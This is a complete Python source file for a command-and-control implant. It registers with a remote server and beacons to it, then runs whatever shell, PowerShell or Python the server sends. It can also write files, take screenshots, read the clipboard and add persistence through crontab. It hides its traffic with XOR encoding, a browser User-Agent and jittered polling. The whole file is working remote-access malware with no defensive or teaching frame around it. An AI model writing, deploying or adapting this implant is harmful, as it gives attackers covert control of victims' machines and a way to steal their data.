#!/usr/bin/env python3
"""C2 Agent — Linux/Unix/macOS/Colab universal agent v2."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, shutil, struct
from urllib.request import Request, urlopen
from urllib.error import URLError
from base64 import b64encode, b64decode

C2_URL = os.environ.get("C2_URL", "http://CHANGE_ME:443")
AGENT_ID = os.environ.get("AGENT_ID", str(uuid.uuid4()))
SLEEP = int(os.environ.get("SLEEP", "5"))
JITTER = int(os.environ.get("JITTER", "10"))
PLATFORM_TYPE = os.environ.get("PLATFORM_TYPE", "machine")
ENC_KEY = os.environ.get("ENC_KEY", "")
AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")

def xor_crypt(data: bytes, key: bytes) -> bytes:
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))

def detect_platform():
    if os.path.exists("/proc/1/cgroup"):
        try:
            with open("/proc/1/cgroup") as f:
                cg = f.read()
                if "docker" in cg or "kubepod" in cg or "containerd" in cg:
                    return "container"
        except Exception:
            pass
    if os.environ.get("COLAB_GPU") or os.path.exists("/content"):
        return "colab"
    if os.environ.get("KAGGLE_URL_BASE"):
        return "colab"
    if any(x in platform.node().lower() for x in ["aws", "gcp", "azure", "cloud", "ec2"]):
        return "cloud"
    try:
        r = subprocess.check_output("systemd-detect-virt 2>/dev/null || echo none", shell=True).decode().strip()
        if r not in ("none", ""):
            return "vm"
    except Exception:
        pass
    return "machine"

def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def http_post(path, data):
    payload_str = json.dumps(data)
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    if AUTH_TOKEN:
        headers["X-Auth-Token"] = AUTH_TOKEN

    if ENC_KEY:
        body = b64encode(xor_crypt(payload_str.encode("utf-8"), ENC_KEY.encode())).decode()
        headers["X-Enc"] = "1"
        headers["Content-Type"] = "text/plain"
    else:
        body = payload_str

    req = Request(f"{C2_URL}{path}", data=body.encode(), headers=headers)
    resp = urlopen(req, timeout=15)
    raw = resp.read()

    if ENC_KEY and resp.headers.get("Content-Type", "").startswith("text/plain"):
        try:
            decrypted = xor_crypt(b64decode(raw), ENC_KEY.encode()).decode("utf-8")
            return json.loads(decrypted)
        except Exception:
            pass
    return json.loads(raw)

def collect_sysinfo():
    info = {}
    try:
        info["cpu_count"] = os.cpu_count()
        info["hostname"] = socket.gethostname()
        info["platform"] = platform.platform()
        info["python"] = platform.python_version()
    except Exception:
        pass
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal"):
                    info["mem_total_mb"] = int(line.split()[1]) // 1024
                    break
    except Exception:
        pass
    try:
        r = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total --format=csv,noheader,nounits 2>/dev/null", shell=True).decode().strip()
        if r:
            info["gpu"] = r
    except Exception:
        pass
    try:
        st = os.statvfs("/")
        info["disk_free_gb"] = round((st.f_bavail * st.f_frsize) / (1024**3), 1)
    except Exception:
        pass
    return info

def register():
    pt = PLATFORM_TYPE if PLATFORM_TYPE != "machine" else detect_platform()
    info = {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "username": os.popen("whoami").read().strip(),
        "os": f"{platform.system()} {platform.release()}",
        "arch": platform.machine(),
        "ip_internal": get_internal_ip(),
        "platform_type": pt
    }
    return http_post("/api/agent/register", info)

def execute_task(task):
    task_type = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    result = ""

    try:
        if task_type == "cmd":
            result = subprocess.check_output(
                payload, shell=True, stderr=subprocess.STDOUT, timeout=300
            ).decode(errors="replace")

        elif task_type == "powershell":
            result = subprocess.check_output(
                ["powershell", "-ep", "bypass", "-c", payload],
                stderr=subprocess.STDOUT, timeout=300
            ).decode(errors="replace")

        elif task_type == "python":
            old_stdout = sys.stdout
            sys.stdout = buf = __import__("io").StringIO()
            try:
                exec(payload, {"__builtins__": __builtins__})
                result = buf.getvalue()
            finally:
                sys.stdout = old_stdout

        elif task_type == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    data = f.read()
                result = f"[file:{payload}] {len(data)} bytes"
            else:
                result = f"File not found: {payload}"

        elif task_type == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                result = f"Written {path}"

        elif task_type == "screenshot":
            try:
                import mss
                with mss.mss() as sct:
                    sct.shot(output="/tmp/.screen.png")
                result = "Screenshot saved to /tmp/.screen.png"
            except ImportError:
                result = subprocess.check_output(
                    "screencapture /tmp/.screen.png 2>/dev/null && echo ok || echo 'no screenshot tool'",
                    shell=True
                ).decode().strip()

        elif task_type == "sysinfo":
            result = json.dumps(collect_sysinfo(), indent=2)

        elif task_type == "persist":
            cron_line = f"*/5 * * * * python3 {os.path.abspath(__file__)}"
            os.system(f'(crontab -l 2>/dev/null | grep -v "{os.path.abspath(__file__)}"; echo "{cron_line}") | crontab -')
            result = "Persistence added via crontab"

        elif task_type == "kill":
            result = "Agent terminating"
            try:
                os.system(f'crontab -l 2>/dev/null | grep -v "{os.path.abspath(__file__)}" | crontab -')
            except Exception:
                pass
            http_post("/api/agent/result", {"task_id": task["id"], "result": result})
            sys.exit(0)

        elif task_type == "clipboard":
            try:
                result = subprocess.check_output(
                    "xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || pbpaste 2>/dev/null || echo 'no clipboard tool'",
                    shell=True, timeout=5
                ).decode(errors="replace")
            except Exception as e:
                result = f"clipboard error: {e}"

        else:
            result = f"Unknown task type: {task_type}"

    except subprocess.TimeoutExpired:
        result = "[timeout exceeded]"
    except Exception as e:
        result = f"[error] {str(e)}"

    if len(result) > 65000:
        result = result[:65000] + "\n[...truncated]"

    return result

def beacon_loop():
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
            for task in resp.get("tasks", []):
                try:
                    result = execute_task(task)
                    http_post("/api/agent/result", {"task_id": task["id"], "result": result})
                except Exception as e:
                    try:
                        http_post("/api/agent/result", {"task_id": task["id"], "result": f"[agent error] {e}"})
                    except Exception:
                        pass
        except Exception:
            pass

        import random
        jitter_secs = SLEEP * JITTER / 100
        actual_sleep = SLEEP + random.uniform(-jitter_secs, jitter_secs)
        time.sleep(max(1, actual_sleep))

if __name__ == "__main__":
    while True:
        try:
            register()
            break
        except Exception:
            time.sleep(10)

    beacon_loop()
